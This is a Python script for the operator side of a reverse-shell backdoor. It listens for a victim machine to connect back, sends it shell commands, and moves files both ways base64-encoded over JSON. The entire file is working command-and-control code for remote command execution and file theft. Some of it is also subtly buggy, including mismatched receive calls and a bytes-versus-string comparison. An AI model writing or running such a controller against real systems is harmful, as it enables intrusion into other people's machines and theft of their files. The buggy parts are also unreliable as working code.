#!/usr/bin/env python
import json
import socket
import optparse
import base64


class Listener:
    def __init__(self, ip="127.0.0.1", port=44444):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create socket object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # enable option to reuse socket
        listener.bind((ip, port))  # bind to port
        listener.listen(0)  # amount of connections to accept, before starting to refuse
        print(f"[+] Waiting for incoming connection on {ip}:{port}")
        self.connection, address = listener.accept()  # accept the connection
        print(f"[+] Connection established {str(address)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError as e:
                print(f"\n[+] DEBUG: ValueError {e}\n")
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit(0)

        return self.connection.recv(1024)

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception as e:
                print(f"[-] Error during command execution: {e}")
            print(result)


parser = optparse.OptionParser()
parser.add_option("--ip", dest="ip", default="127.0.0.1", help="IP to connect to")
parser.add_option("--port", dest="port", default=44444, help="Port to connect to")
(options, arguments) = parser.parse_args()
my_listener = Listener(options.ip, options.port)
my_listener.run()
